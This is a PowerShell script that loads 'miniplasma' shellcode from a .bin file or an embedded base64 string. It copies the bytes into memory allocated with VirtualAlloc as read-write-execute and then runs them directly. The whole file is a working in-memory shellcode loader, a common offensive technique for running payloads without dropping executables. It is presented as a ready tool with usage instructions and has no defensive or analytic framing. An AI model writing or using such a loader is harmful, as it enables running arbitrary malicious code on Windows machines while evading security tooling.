# Load and execute miniplasma shellcode from a .bin file or base64
#
# Usage:
#   From base64 (embed directly):
#     $b64 = "Q29udmVydF..."  (base64 < build/miniplasma_2_sc.bin | tr -d '\n')
#     .\run_sc.ps1
#
#   From file:
#     .\run_sc.ps1 -Path build\miniplasma_2_sc.bin

param([string]$Path = "")

# --- paste base64 below (or leave empty and use -Path) ---
$B64 = ""
# ---

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lp, uint sz, uint type, uint prot);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lp, uint sz, uint prot, out uint old);
}
"@

if ($Path -ne "") {
    $bytes = [System.IO.File]::ReadAllBytes((Resolve-Path $Path))
} elseif ($B64 -ne "") {
    $bytes = [System.Convert]::FromBase64String($B64)
} else {
    Write-Host "Usage: set `$B64 or pass -Path <file.bin>"
    exit 1
}

# Allocate, copy, make executable, call
$addr = [Win32]::VirtualAlloc([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)  # MEM_COMMIT|RESERVE, RWX
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$f = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Type]([Action]))
$f.Invoke()
